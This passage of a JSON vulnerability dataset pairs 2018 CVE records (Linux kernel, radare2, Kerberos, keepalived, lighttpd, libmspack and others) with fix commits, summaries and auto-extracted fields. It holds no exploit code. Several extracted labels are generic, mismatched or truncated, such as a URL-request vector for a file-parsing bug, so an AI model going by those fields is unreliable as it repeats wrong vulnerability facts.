via a stack-based buffer over-read) by crafting an input file, a related issue to CVE-2018-20455.","commit_message_1":"fix # <number> and # <number> - crash in x86 assembler ( # <number> )","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"via a stack - based buffer over - read ) by crafting an input file , a related issue to cve - 2018 - 20455","Impact":"cause a denial of service ( application crash in libr \/ util \/ strbuf . c","Root Cause":"caused by a stack-based buffer over-read flaw","Attack Type":"remote attacker"},{"commit_id":"5e6d1796106df8ba6bc1973ee0917c170d929086","cve_id":"CVE-2018-20217","cwe_id":"CWE-617","commit_message":"Ignore password attributes for S4U2Self requests\n\nFor consistency with Windows KDCs, allow protocol transition to work\neven if the password has expired or needs changing.\n\nAlso, when looking up an enterprise principal with an AS request,\ntreat ERR_KEY_EXP as confirmation that the client is present in the\nrealm.\n\n[ghudson@mit.edu: added comment in kdc_process_s4u2self_req(); edited\ncommit message]\n\nticket: 8763 (new)\ntags: pullup\ntarget_version: 1.17","summary":"A Reachable Assertion issue was discovered in the KDC in MIT Kerberos 5 (aka krb5) before 1.17. If an attacker can obtain a krbtgt ticket using an older encryption type (single-DES, triple-DES, or RC4), the attacker can crash the KDC by making an S4U2Self request.","commit_message_1":"ignore password attribute for s4u2self request for consistency with window kdcs , allow protocol transition to work even if the password ha expired or need changing","Vulnerability Type":"Reachable Assertion","Attack Vector":"by making an s4u2self request","Impact":"cause a denial of service","Root Cause":"caused by an reachable assertion flaw","Attack Type":"remote attacker"},{"commit_id":"704620afc70cf47abb9d6a1a57f3825d2bca49cf","cve_id":"CVE-2018-20169","cwe_id":"CWE-400","commit_message":"USB: check usb_get_extra_descriptor for proper size\n\nWhen reading an extra descriptor, we need to properly check the minimum\nand maximum size allowed, to prevent from invalid data being sent by a\ndevice.\n\nReported-by: Hui Peng <benquike@gmail.com>\nReported-by: Mathias Payer <mathias.payer@nebelwelt.net>\nCo-developed-by: Linus Torvalds <torvalds@linux-foundation.org>\nSigned-off-by: Hui Peng <benquike@gmail.com>\nSigned-off-by: Mathias Payer <mathias.payer@nebelwelt.net>\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>\nCc: stable <stable@kernel.org>\nSigned-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>","summary":"An issue was discovered in the Linux kernel before 4.19.9. The USB subsystem mishandles size checks during the reading of an extra descriptor, related to __usb_get_extra_descriptor in drivers\/usb\/core\/usb.c.","commit_message_1":"check usb_get_extra_descriptor for proper size when reading an extra descriptor , we need to properly check the minimum and maximum size allowed , to prevent from invalid data being sent by a device","Vulnerability Type":"Uncontrolled Resource Consumption","Attack Vector":"By sending a specially-crafted request","Impact":"cause a denial of service","Root Cause":"caused by improper size validation by the __usb_get_extra_descriptor function","Attack Type":"local attacker"},{"commit_id":"9097577b49b7fdcf45d30975976dd93808ccc0c4","cve_id":"CVE-2018-20145","cwe_id":null,"commit_message":"Fix acl_file being ignore for default listener if with per_listener_settings\n\nClose #1073. Thanks to Jef Driesen.\n\nBug: https:\/\/github.com\/eclipse\/mosquitto\/issues\/1073","summary":"Eclipse Mosquitto 1.5.x before 1.5.5 allows ACL bypass: if the option per_listener_settings was set to true, and the default listener was in use, and the default listener specified an acl_file, then the acl file was being ignored.","commit_message_1":"fix acl_file being ignore for default listener if with per_listener_settings close # <number>","Vulnerability Type":"unspecified","Attack Vector":"By sending a specially-crafted request","Impact":"bypass security restrictions","Root Cause":"caused by an improper access control flaw when per_listener_settings option is enabled","Attack Type":"remote attacker"},{"commit_id":"f43f39958beb206b53292801e216d9b8a660f087","cve_id":"CVE-2018-19854","cwe_id":null,"commit_message":"crypto: user - fix leaking uninitialized memory to userspace\n\nAll bytes of the NETLINK_CRYPTO report structures must be initialized,\nsince they are copied to userspace.  The change from strncpy() to\nstrlcpy() broke this.  As a minimal fix, change it back.\n\nFixes: 4473710df1f8 (\"crypto: user - Prepare for CRYPTO_MAX_ALG_NAME expansion\")\nCc: <stable@vger.kernel.org> # v4.12+\nSigned-off-by: Eric Biggers <ebiggers@google.com>\nSigned-off-by: Herbert Xu <herbert@gondor.apana.org.au>","summary":"An issue was discovered in the Linux kernel before 4.19.3. crypto_report_one() and related functions in crypto\/crypto_user.c (the crypto user configuration API) do not fully initialize structures that are copied to userspace, potentially leaking sensitive memory to user programs. NOTE: this is a CVE-2013-2547 regression but with easier exploitability because the attacker does not need a capability (however, the system must have the CONFIG_CRYPTO_USER kconfig option).","commit_message_1":"user - fix leaking uninitialized memory to userspace all byte of the netlink_crypto report structure must be initialized , since they are copied to userspace","Vulnerability Type":"unspecified","Attack Vector":"the crypto user configuration API","Impact":"obtain sensitive information","Root Cause":"do not fully initialize structures that are copied to userspace , potentially leaking sensitive memory to user programs","Attack Type":"local attacker"},{"commit_id":"f17bfd9f1da05f30f23a4dd05e9d2363e1406948","cve_id":"CVE-2018-19843","cwe_id":"CWE-125","commit_message":"Fix #12242 - Crash in x86.nz assembler (#12266)","summary":"opmov in libr\/asm\/p\/asm_x86_nz.c in radare2 before 3.1.0 allows attackers to cause a denial of service (buffer over-read) via crafted x86 assembly data, as demonstrated by rasm2.","commit_message_1":"fix # <number> - crash in <file> assembler ( # <number> )","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"via crafted x86 assembly data , as demonstrated by rasm2","Impact":"cause a denial of service ( buffer over - read )","Root Cause":"caused by a buffer over-read","Attack Type":"remote attacker"},{"commit_id":"66191f780863ea8c66ace4040d0d04a8842e8432","cve_id":"CVE-2018-19842","cwe_id":"CWE-125","commit_message":"Fix #12239 - crash in the x86.nz assembler ##asm (#12252)","summary":"getToken in libr\/asm\/p\/asm_x86_nz.c in radare2 before 3.1.0 allows attackers to cause a denial of service (stack-based buffer over-read) via crafted x86 assembly data, as demonstrated by rasm2.","commit_message_1":"fix # <number> - crash in the <file> assembler # # asm ( # <number> )","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"via crafted x86 assembly data , as demonstrated by rasm2","Impact":"cause a denial of service ( stack - based buffer over - read )","Root Cause":"caused by a stack-based buffer over-read","Attack Type":"remote attacker"},{"commit_id":"bba5389dc598a92bdf2b297c3ea34620b6679b5b","cve_id":"CVE-2018-19841","cwe_id":"CWE-125","commit_message":"issue #54: fix potential out-of-bounds heap read","summary":"The function WavpackVerifySingleBlock in open_utils.c in libwavpack.a in WavPack through 5.1.0 allows attackers to cause a denial-of-service (out-of-bounds read and application crash) via a crafted WavPack Lossless Audio file, as demonstrated by wvunpack.","commit_message_1":"issue # <number> : fix potential out-of-bounds heap read","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"via a crafted wavpack lossless audio file , as demonstrated by wvunpack","Impact":"cause a denial - of - service ( out - of - bounds read and application crash )","Root Cause":"caused by an out-of-bounds read","Attack Type":"remote attacker"},{"commit_id":"070ef6f138956d9ea9612e69586152339dbefe51","cve_id":"CVE-2018-19840","cwe_id":"CWE-835","commit_message":"issue #53: error out on zero sample rate","summary":"The function WavpackPackInit in pack_utils.c in libwavpack.a in WavPack through 5.1.0 allows attackers to cause a denial-of-service (resource exhaustion caused by an infinite loop) via a crafted wav audio file because WavpackSetConfiguration64 mishandles a sample rate of zero.","commit_message_1":"issue # <number> : error out on zero sample rate","Vulnerability Type":"Infinite Loop","Attack Vector":"By persuading a victim to open a specially-crafted file","Impact":"cause a denial of service","Root Cause":"caused by an error","Attack Type":"remote attacker"},{"commit_id":"210fdff7a65370c2ae24e022a2b35da8c423cc5f","cve_id":"CVE-2018-19837","cwe_id":"CWE-400","commit_message":"Remove legacy workaround for parsing modulo operator\n\nFixes #2659","summary":"In LibSass prior to 3.5.5, Sass::Eval::operator()(Sass::Binary_Expression*) inside eval.cpp allows attackers to cause a denial-of-service resulting from stack consumption via a crafted sass file, because of certain incorrect parsing of '%' as a modulo operator in parser.cpp.","commit_message_1":"remove legacy workaround for parsing modulo operator","Vulnerability Type":"Uncontrolled Resource Consumption","Attack Vector":"via a crafted sass file , because of certain incorrect parsing of ' % ' as a modulo operator in parser . cpp","Impact":"cause a denial of service","Root Cause":"caused by a stack-based buffer overflow","Attack Type":"remote attacker"},{"commit_id":"5f8cf712582617d523120df67d392059eaf2fc4b","cve_id":"CVE-2018-19824","cwe_id":"CWE-416","commit_message":"ALSA: usb-audio: Fix UAF decrement if card has no live interfaces in card.c\n\nIf a USB sound card reports 0 interfaces, an error condition is triggered\nand the function usb_audio_probe errors out. In the error path, there was a\nuse-after-free vulnerability where the memory object of the card was first\nfreed, followed by a decrement of the number of active chips. Moving the\ndecrement above the atomic_dec fixes the UAF.\n\n[ The original problem was introduced in 3.1 kernel, while it was\n  developed in a different form.  The Fixes tag below indicates the\n  original commit but it doesn't mean that the patch is applicable\n  cleanly. -- tiwai ]\n\nFixes: 362e4e49abe5 (\"ALSA: usb-audio - clear chip->probing on error exit\")\nReported-by: Hui Peng <benquike@gmail.com>\nReported-by: Mathias Payer <mathias.payer@nebelwelt.net>\nSigned-off-by: Hui Peng <benquike@gmail.com>\nSigned-off-by: Mathias Payer <mathias.payer@nebelwelt.net>\nCc: <stable@vger.kernel.org>\nSigned-off-by: Takashi Iwai <tiwai@suse.de>","summary":"In the Linux kernel through 4.19.6, a local user could exploit a use-after-free in the ALSA driver by supplying a malicious USB Sound device (with zero interfaces) that is mishandled in usb_audio_probe in sound\/usb\/card.c.","commit_message_1":"usb-audio : fix uaf decrement if card ha no live interface in <file> if a usb sound card report <number> interface , an error condition is triggered and the function usb_audio_probe error out","Vulnerability Type":"Use After Free","Attack Vector":"By plugging in a malicious USB device that replays the trace","Impact":"gain elevated privileges","Root Cause":"caused by a use-after-free write","Attack Type":"local attacker"},{"commit_id":"bc04aa017c0bd297de8a3b7fc40ffc6ddddbb95d","cve_id":"CVE-2018-19497","cwe_id":"CWE-125","commit_message":"Merge pull request #1374 from JordyZomer\/develop\n\nFix CVE-2018-19497.","summary":"In The Sleuth Kit (TSK) through 4.6.4, hfs_cat_traverse in tsk\/fs\/hfs.c does not properly determine when a key length is too large, which allows attackers to cause a denial of service (SEGV on unknown address with READ memory access in a tsk_getu16 call in hfs_dir_open_meta_cb in tsk\/fs\/hfs_dent.c).","commit_message_1":"merge pull request # <number> from jordyzomer\/develop fix <cve_id>","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"By persuading a victim to open a specially-crafted file","Impact":"cause a denial of service ( segv on unknown address with read memory access in a tsk _ getu16 call in hfs _ dir _ open _ meta _ cb in tsk \/ fs \/ hfs _ dent . c ) ","Root Cause":"does not properly determine when a key length is too large","Attack Type":"remote attacker"},{"commit_id":"f58c25069cf4a986fe17a80c5b38687e31feb539","cve_id":"CVE-2018-19200","cwe_id":"CWE-476","commit_message":"ResetUri: Protect against NULL","summary":"An issue was discovered in uriparser before 0.9.0. UriCommon.c allows attempted operations on NULL input via a uriResetUri* function.","commit_message_1":"reseturi : protect against null","Vulnerability Type":"NULL Pointer Dereference","Attack Vector":"By using NULL input in the uriResetUri* function","Impact":"launch further attacks on the system","Root Cause":"caused by improper input validation","Attack Type":"remote attacker"},{"commit_id":"2105dae0f9d7a964375ce681e53cb165375f84c1","cve_id":"CVE-2018-19052","cwe_id":null,"commit_message":"[mod_alias] security: potential path traversal with specific configs\n\nSecurity: potential path traversal of a single directory above the alias\ntarget with a specific mod_alias config where the alias which is matched\ndoes not end in '\/', but alias target filesystem path does end in '\/'.\n\ne.g. server.docroot = \"\/srv\/www\/host\/HOSTNAME\/docroot\"\n     alias.url = ( \"\/img\" => \"\/srv\/www\/hosts\/HOSTNAME\/images\/\" )\n\nIf a malicious URL \"\/img..\/\" were passed, the request would be\nfor directory \"\/srv\/www\/hosts\/HOSTNAME\/images\/..\/\" which would resolve\nto \"\/srv\/www\/hosts\/HOSTNAME\/\".  If mod_dirlisting were enabled, which\nis not the default, this would result in listing the contents of the\ndirectory above the alias.  An attacker might also try to directly\naccess files anywhere under that path, which is one level above the\nintended aliased path.\n\ncredit: Orange Tsai(@orange_8361) from DEVCORE","summary":"An issue was discovered in mod_alias_physical_handler in mod_alias.c in lighttpd before 1.4.50. There is potential ..\/ path traversal of a single directory above an alias target, with a specific mod_alias configuration where the matched alias lacks a trailing '\/' character, but the alias target filesystem path does have a trailing '\/' character.","commit_message_1":"potential path traversal with specific configs security : potential path traversal of a single directory above the alias target with a specific mod_alias config where the alias which is matched doe not end in '\/ ' , but alias target filesystem path doe end in '\/ '","Vulnerability Type":"unspecified","Attack Vector":"with a specific mod_alias configuration","Impact":"traverse directories on the system","Root Cause":"caused by a flaw","Attack Type":"remote attacker"},{"commit_id":"c6247a9ef2c7b33244ab1d3aa5d629ec49f0a067","cve_id":"CVE-2018-19045","cwe_id":"CWE-200","commit_message":"Add command line and configuration option to set umask\n\nIssue #1048 identified that files created by keepalived are created\nwith mode 0666. This commit changes the default to 0644, and also\nallows the umask to be specified in the configuration or as a command\nline option.\n\nSigned-off-by: Quentin Armitage <quentin@armitage.org.uk>","summary":"keepalived 2.0.8 used mode 0666 when creating new temporary files upon a call to PrintData or PrintStats, potentially leaking sensitive information.","commit_message_1":"add command line and configuration option to set umask issue # <number> identified that file created by keepalived are created with mode <number>","Vulnerability Type":"Exposure of Sensitive Information to an Unauthorized Actor","Attack Vector":"By sending a specially-crafted request","Impact":"obtain sensitive information","Root Cause":"caused by the use of used mode 0666 to create new temporary files when making PrintData or PrintStats function calls","Attack Type":"remote attacker"},{"commit_id":"04f2d32871bb3b11d7dc024039952f2fe2750306","cve_id":"CVE-2018-19044","cwe_id":"CWE-59","commit_message":"When opening files for write, ensure they aren't symbolic links\n\nIssue #1048 identified that if, for example, a non privileged user\ncreated a symbolic link from \/etc\/keepalvied.data to \/etc\/passwd,\nwriting to \/etc\/keepalived.data (which could be invoked via DBus)\nwould cause \/etc\/passwd to be overwritten.\n\nThis commit stops keepalived writing to pathnames where the ultimate\ncomponent is a symbolic link, by setting O_NOFOLLOW whenever opening\na file for writing.\n\nThis might break some setups, where, for example, \/etc\/keepalived.data\nwas a symbolic link to \/home\/fred\/keepalived.data. If this was the case,\ninstead create a symbolic link from \/home\/fred\/keepalived.data to\n\/tmp\/keepalived.data, so that the file is still accessible via\n\/home\/fred\/keepalived.data.\n\nThere doesn't appear to be a way around this backward incompatibility,\nsince even checking if the pathname is a symbolic link prior to opening\nfor writing would create a race condition.\n\nSigned-off-by: Quentin Armitage <quentin@armitage.org.uk>","summary":"keepalived 2.0.8 didn't check for pathnames with symlinks when writing data to a temporary file upon a call to PrintData or PrintStats. This allowed local users to overwrite arbitrary files if fs.protected_symlinks is set to 0, as demonstrated by a symlink from \/tmp\/keepalived.data or \/tmp\/keepalived.stats to \/etc\/passwd.","commit_message_1":"when opening file for write , ensure they are n't symbolic link issue # <number> identified that if , for example , a non privileged user created a symbolic link from \/etc\/<file> to \/etc\/passwd , writing to \/etc\/<file> ( which could be invoked via dbus ) would cause \/etc\/passwd to be overwritten","Vulnerability Type":"Link Following","Attack Vector":"by creating a symbolic link from a temporary file to various files on the system","Impact":"overwrite arbitrary","Root Cause":"PrintData or PrintStats function calls create temporary files insecurely","Attack Type":"local attacker"},{"commit_id":"d2f007dbe7e4c9583eea6eb04d60001e85c6f1bd","cve_id":"CVE-2018-18955","cwe_id":"CWE-20","commit_message":"userns: also map extents in the reverse map to kernel IDs\n\nThe current logic first clones the extent array and sorts both copies, then\nmaps the lower IDs of the forward mapping into the lower namespace, but\ndoesn't map the lower IDs of the reverse mapping.\n\nThis means that code in a nested user namespace with >5 extents will see\nincorrect IDs. It also breaks some access checks, like\ninode_owner_or_capable() and privileged_wrt_inode_uidgid(), so a process\ncan incorrectly appear to be capable relative to an inode.\n\nTo fix it, we have to make sure that the \"lower_first\" members of extents\nin both arrays are translated; and we have to make sure that the reverse\nmap is sorted *after* the translation (since otherwise the translation can\nbreak the sorting).\n\nThis is CVE-2018-18955.\n\nFixes: 6397fac4915a (\"userns: bump idmap limits to 340\")\nCc: stable@vger.kernel.org\nSigned-off-by: Jann Horn <jannh@google.com>\nTested-by: Eric W. Biederman <ebiederm@xmission.com>\nReviewed-by: Eric W. Biederman <ebiederm@xmission.com>\nSigned-off-by: Eric W. Biederman <ebiederm@xmission.com>","summary":"In the Linux kernel 4.15.x through 4.19.x before 4.19.2, map_write() in kernel\/user_namespace.c allows privilege escalation because it mishandles nested user namespaces with more than 5 UID or GID ranges. A user who has CAP_SYS_ADMIN in an affected user namespace can bypass access controls on resources outside the namespace, as demonstrated by reading \/etc\/shadow. This occurs because an ID transformation takes place properly for the namespaced-to-kernel direction but not for the kernel-to-namespaced direction.","commit_message_1":"also map extent in the reverse map to kernel id the current logic first clone the extent array and sort both copy , then map the lower id of the forward mapping into the lower namespace , but doe n't map the lower id of the reverse mapping","Vulnerability Type":"Improper Input Validation","Attack Vector":"an ID transformation takes place properly for the namespaced-to-kernel direction but not for the kernel-to-namespaced direction","Impact":"gain elevated privileges","Root Cause":"caused by the incorrect granting of privileges over inode by nested user namespaces with more than five mappings","Attack Type":"local attacker"},{"commit_id":"e4f3aa2e1e67bb48dfbaaf1cad59013d5a5bc276","cve_id":"CVE-2018-18710","cwe_id":"CWE-200","commit_message":"cdrom: fix improper type cast, which can leat to information leak.\n\nThere is another cast from unsigned long to int which causes\na bounds check to fail with specially crafted input. The value is\nthen used as an index in the slot array in cdrom_slot_status().\n\nThis issue is similar to CVE-2018-16658 and CVE-2018-10940.\n\nSigned-off-by: Young_X <YangX92@hotmail.com>\nSigned-off-by: Jens Axboe <axboe@kernel.dk>","summary":"An issue was discovered in the Linux kernel through 4.19. An information leak in cdrom_ioctl_select_disc in drivers\/cdrom\/cdrom.c could be used by local attackers to read kernel memory because a cast from unsigned long to int interferes with bounds checking. This is similar to CVE-2018-10940 and CVE-2018-16658.","commit_message_1":"fix improper type cast , which can leat to information leak","Vulnerability Type":"Exposure of Sensitive Information to an Unauthorized Actor","Attack Vector":"An information leak in cdrom_ioctl_select_disc in drivers\/cdrom\/cdrom.c","Impact":"read kernel memory because a cast from unsigned long to int interferes with bounds checking","Root Cause":"caused by improper bounds checking","Attack Type":"local attacker"},{"commit_id":"7b38460dc8e4eafba06c78f8e37099d3b34d473c","cve_id":"CVE-2018-18690","cwe_id":"CWE-754","commit_message":"xfs: don't fail when converting shortform attr to long form during ATTR_REPLACE\n\nKanda Motohiro reported that expanding a tiny xattr into a large xattr\nfails on XFS because we remove the tiny xattr from a shortform fork and\nthen try to re-add it after converting the fork to extents format having\nnot removed the ATTR_REPLACE flag.  This fails because the attr is no\nlonger present, causing a fs shutdown.\n\nThis is derived from the patch in his bug report, but we really\nshouldn't ignore a nonzero retval from the remove call.\n\nBugzilla: https:\/\/bugzilla.kernel.org\/show_bug.cgi?id=199119\nReported-by: kanda.motohiro@gmail.com\nReviewed-by: Dave Chinner <dchinner@redhat.com>\nReviewed-by: Christoph Hellwig <hch@lst.de>\nSigned-off-by: Darrick J. Wong <darrick.wong@oracle.com>","summary":"In the Linux kernel before 4.17, a local attacker able to set attributes on an xfs filesystem could make this filesystem non-operational until the next mount by triggering an unchecked error condition during an xfs attribute change, because xfs_attr_shortform_addname in fs\/xfs\/libxfs\/xfs_attr.c mishandles ATTR_REPLACE operations with conversion of an attr from short to long form.","commit_message_1":"do n't fail when converting shortform attr to long form during attr_replace kanda motohiro reported that expanding a tiny xattr into a large xattr fails on xfs because we remove the tiny xattr from a shortform fork and then try to re-add it after converting the fork to extent format having not removed the attr_replace flag","Vulnerability Type":"Improper Check for Unusual or Exceptional Conditions","Attack Vector":"triggering an unchecked error condition during an xfs attribute change , because xfs _ attr _ shortform _ addname in fs \/ xfs \/ libxfs \/ xfs _ attr . c mishandles attr _ replace operations with conversion of an attr from short to long form","Impact":"cause the system to become non-operationa","Root Cause":"caused by a flaw","Attack Type":"local attacker"},{"commit_id":"7cadd489698be117c47efcadd742651594429e6d","cve_id":"CVE-2018-18586","cwe_id":"CWE-22","commit_message":"add anti \"..\/\" and leading slash protection to chmextract","summary":"** DISPUTED ** chmextract.c in the chmextract sample program, as distributed with libmspack before 0.8alpha, does not protect against absolute\/relative pathnames in CHM files, leading to Directory Traversal. NOTE: the vendor disputes that this is a libmspack vulnerability, because chmextract.c was only intended as a source-code example, not a supported application.","commit_message_1":"add anti ``","Vulnerability Type":"Path Traversal","Attack Vector":"send a specially-crafted URL request containing \"dot dot\" sequences (\/..\/)","Impact":"view arbitrary files","Root Cause":"caused by improper validation of user request by the chmextract sample program","Attack Type":"remote attacker"},{"commit_id":"8759da8db6ec9e866cb8eb143313f397f925bb4f","cve_id":"CVE-2018-18585","cwe_id":"CWE-476","commit_message":"Avoid returning CHM file entries that are \"blank\" because they have embedded null bytes","summary":"chmd_read_headers in mspack\/chmd.c in libmspack before 0.8alpha accepts a filename that has '0' as its first or second character (such as the *\/0* name).","commit_message_1":"avoid returning chm file entry that are `` blank '' because they have embedded null byte","Vulnerability Type":"NULL Pointer Dereference","Attack Vector":"accepts a filename that has '0' as its first or second character","Impact":"launch further attacks on the system","Root Cause":"caused by the acceptance of CHM file entries that are \"blank\" because they have embedded null bytes","Attack Type":"attacker"},{"commit_id":"b799207e1e1816b09e7a5920fbb2d5fcf6edd681","cve_id":"CVE-2018-18445","cwe_id":"CWE-125","commit_message":"bpf: 32-bit RSH verification must truncate input before the ALU op\n\nWhen I wrote commit 468f6eafa6c4 (\"bpf: fix 32-bit ALU op verification\"), I\nassumed that, in order to emulate 64-bit arithmetic with 32-bit logic, it\nis sufficient to just truncate the output to 32 bits; and so I just moved\nthe register size coercion that used to be at the start of the function to\nthe end of the function.\n\nThat assumption is true for almost every op, but not for 32-bit right\nshifts, because those can propagate information towards the least\nsignificant bit. Fix it by always truncating inputs for 32-bit ops to 32\nbits.\n\nAlso get rid of the coerce_reg_to_size() after the ALU op, since that has\nno effect.\n\nFixes: 468f6eafa6c4 (\"bpf: fix 32-bit ALU op verification\")\nAcked-by: Daniel Borkmann <daniel@iogearbox.net>\nSigned-off-by: Jann Horn <jannh@google.com>\nSigned-off-by: Daniel Borkmann <daniel@iogearbox.net>","summary":"In the Linux kernel 4.14.x, 4.15.x, 4.16.x, 4.17.x, and 4.18.x before 4.18.13, faulty computation of numeric bounds in the BPF verifier permits out-of-bounds memory accesses because adjust_scalar_min_max_vals in kernel\/bpf\/verifier.c mishandles 32-bit right shifts.","commit_message_1":"<number>-bit rsh verification must truncate input before the alu op when i wrote commit 468f6eafa6c4 ( `` bpf : fix <number>-bit alu op verification '' ) , i assumed that , in order to emulate <number>-bit arithmetic with <number>-bit logic , it is sufficient to just truncate the output to <number> bit ; and so i just moved the register size coercion that used to be at the start of the function to the end of the function","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"adjust_scalar_min_max_vals in kernel\/bpf\/verifier.c mishandles 32-bit right shifts","Impact":"gain elevated privileges","Root Cause":"caused by an out-of-bounds memory access by faulty computation of numeric bounds","Attack Type":"local attacker"},{"commit_id":"29ec90660d68bbdd69507c1c8b4e33aa299278b1","cve_id":"CVE-2018-18397","cwe_id":null,"commit_message":"userfaultfd: shmem\/hugetlbfs: only allow to register VM_MAYWRITE vmas\n\nAfter the VMA to register the uffd onto is found, check that it has\nVM_MAYWRITE set before allowing registration.  This way we inherit all\ncommon code checks before allowing to fill file holes in shmem and\nhugetlbfs with UFFDIO_COPY.\n\nThe userfaultfd memory model is not applicable for readonly files unless\nit's a MAP_PRIVATE.\n\nLink: http:\/\/lkml.kernel.org\/r\/20181126173452.26955-4-aarcange@redhat.com\nFixes: ff62a3421044 (\"hugetlb: implement memfd sealing\")\nSigned-off-by: Andrea Arcangeli <aarcange@redhat.com>\nReviewed-by: Mike Rapoport <rppt@linux.ibm.com>\nReviewed-by: Hugh Dickins <hughd@google.com>\nReported-by: Jann Horn <jannh@google.com>\nFixes: 4c27fe4c4c84 (\"userfaultfd: shmem: add shmem_mcopy_atomic_pte for userfaultfd support\")\nCc: <stable@vger.kernel.org>\nCc: \"Dr. David Alan Gilbert\" <dgilbert@redhat.com>\nCc: Mike Kravetz <mike.kravetz@oracle.com>\nCc: Peter Xu <peterx@redhat.com>\nCc: stable@vger.kernel.org\nSigned-off-by: Andrew Morton <akpm@linux-foundation.org>\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>","summary":"The userfaultfd implementation in the Linux kernel before 4.19.7 mishandles access control for certain UFFDIO_ ioctl calls, as demonstrated by allowing local users to write data into holes in a tmpfs file (if the user has read-only access to that file, and that file contains holes), related to fs\/userfaultfd.c and mm\/userfaultfd.c.","commit_message_1":"shmem\/hugetlbfs : only allow to register vm_maywrite vmas after the vma to register the uffd onto is found , check that it ha vm_maywrite set before allowing registration","Vulnerability Type":"userfaultfd implementation","Attack Vector":"related to fs\/userfaultfd.c and mm\/userfaultfd.c","Impact":"bypass security restrictions","Root Cause":"caused by the improper handling of access control for certain UFFDIO_ ioctl calls by the userfaultfd implementation","Attack Type":"local attacker"},{"commit_id":"966031f340185eddd05affcf72b740549f056348","cve_id":"CVE-2018-18386","cwe_id":"CWE-704","commit_message":"n_tty: fix EXTPROC vs ICANON interaction with TIOCINQ (aka FIONREAD)\n\nWe added support for EXTPROC back in 2010 in commit 26df6d13406d (\"tty:\nAdd EXTPROC support for LINEMODE\") and the intent was to allow it to\noverride some (all?) ICANON behavior.  Quoting from that original commit\nmessage:\n\n         There is a new bit in the termios local flag word, EXTPROC.\n         When this bit is set, several aspects of the terminal driver\n         are disabled.  Input line editing, character echo, and mapping\n         of signals are all disabled.  This allows the telnetd to turn\n         off these functions when in linemode, but still keep track of\n         what state the user wants the terminal to be in.\n\nbut the problem turns out that \"several aspects of the terminal driver\nare disabled\" is a bit ambiguous, and you can really confuse the n_tty\nlayer by setting EXTPROC and then causing some of the ICANON invariants\nto no longer be maintained.\n\nThis fixes at least one such case (TIOCINQ) becoming unhappy because of\nthe confusion over whether ICANON really means ICANON when EXTPROC is set.\n\nThis basically makes TIOCINQ match the case of read: if EXTPROC is set,\nwe ignore ICANON.  Also, make sure to reset the ICANON state ie EXTPROC\nchanges, not just if ICANON changes.\n\nFixes: 26df6d13406d (\"tty: Add EXTPROC support for LINEMODE\")\nReported-by: Tetsuo Handa <penguin-kernel@i-love.sakura.ne.jp>\nReported-by: syzkaller <syzkaller@googlegroups.com>\nCc: Jiri Slaby <jslaby@suse.com>\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>\nSigned-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>","summary":"drivers\/tty\/n_tty.c in the Linux kernel before 4.14.11 allows local attackers (who are able to access pseudo terminals) to hang\/block further usage of any pseudo terminal devices due to an EXTPROC versus ICANON confusion in TIOCINQ.","commit_message_1":"fix extproc v icanon interaction with tiocinq ( aka fionread ) we added support for extproc back in <number> in commit 26df6d13406d ( `` tty : add extproc support for linemode '' ) and the intent wa to allow it to override some ( all ? ) icanon behavior","Vulnerability Type":"Incorrect Type Conversion or Cast","Attack Vector":"By sending a specially-crafted request","Impact":"cause a denial of service","Root Cause":"caused by a flaw","Attack Type":"local attacker"},{"commit_id":"d26c25a9d19b5976b319af528886f89cf455692d","cve_id":"CVE-2018-18021","cwe_id":"CWE-20","commit_message":"arm64: KVM: Tighten guest core register access from userspace\n\nWe currently allow userspace to access the core register file\nin about any possible way, including straddling multiple\nregisters and doing unaligned accesses.\n\nThis is not the expected use of the ABI, and nobody is actually\nusing it that way. Let's tighten it by explicitly checking\nthe size and alignment for each field of the register file.\n\nCc: <stable@vger.kernel.org>\nFixes: 2f4a07c5f9fe (\"arm64: KVM: guest one-reg interface\")\nReviewed-by: Christoffer Dall <christoffer.dall@arm.com>\nReviewed-by: Mark Rutland <mark.rutland@arm.com>\nSigned-off-by: Dave Martin <Dave.Martin@arm.com>\n[maz: rewrote Dave's initial patch to be more easily backported]\nSigned-off-by: Marc Zyngier <marc.zyngier@arm.com>\nSigned-off-by: Will Deacon <will.deacon@arm.com>","summary":"arch\/arm64\/kvm\/guest.c in KVM in the Linux kernel before 4.18.12 on the arm64 platform mishandles the KVM_SET_ON_REG ioctl. This is exploitable by attackers who can create virtual machines. An attacker can arbitrarily redirect the hypervisor flow of control (with full register control). An attacker can also cause a denial of service (hypervisor panic) via an illegal exception return. This occurs because of insufficient restrictions on userspace access to the core register file, and because PSTATE.M validation does not prevent unintended execution modes.","commit_message_1":"kvm : tighten guest core register access from userspace we currently allow userspace to access the core register file in about any possible way , including straddling multiple register and doing unaligned access","Vulnerability Type":"Improper Input Validation","Attack Vector":"By sending a specially-crafted request","Impact":"cause a denial of service","Root Cause":"caused by improper input validation by the KVM_SET_ON_REG ioctl call","Attack Type":"local attacker"},{"commit_id":"278b4175c9d7dd47c1a3071554aac02add3b3c35","cve_id":"CVE-2018-17942","cwe_id":"CWE-119","commit_message":"vasnprintf: Fix heap memory overrun bug.\n\nReported by Ben Pfaff <blp@cs.stanford.edu> in\n<https:\/\/lists.gnu.org\/archive\/html\/bug-gnulib\/2018-09\/msg00107.html>.\n\n* lib\/vasnprintf.c (convert_to_decimal): Allocate one more byte of\nmemory.\n* tests\/test-vasnprintf.c (test_function): Add another test.","summary":"The convert_to_decimal function in vasnprintf.c in Gnulib before 2018-09-23 has a heap-based buffer overflow because memory is not allocated for a trailing '0' character during %f processing.","commit_message_1":"fix heap memory overrun bug","Vulnerability Type":"buffer overflow","Attack Vector":"By persuading a victim to open a specially-crafted file","Impact":"overflow a buffer and execute arbitrary code","Root Cause":"has a heap - based buffer overflow because memory is not allocated for a trailing ' 0 ' character during % f processing","Attack Type":"remote attacker"},{"commit_id":"4a7c27bfe98f409623d4d857894d017ff0672cc9#diff-515c81af848352583bff286d6224875f","cve_id":"CVE-2018-17570","cwe_id":"CWE-190","commit_message":"Merge pull request #131 from benjaminchodroff\/master\n\nfix memory corruption and 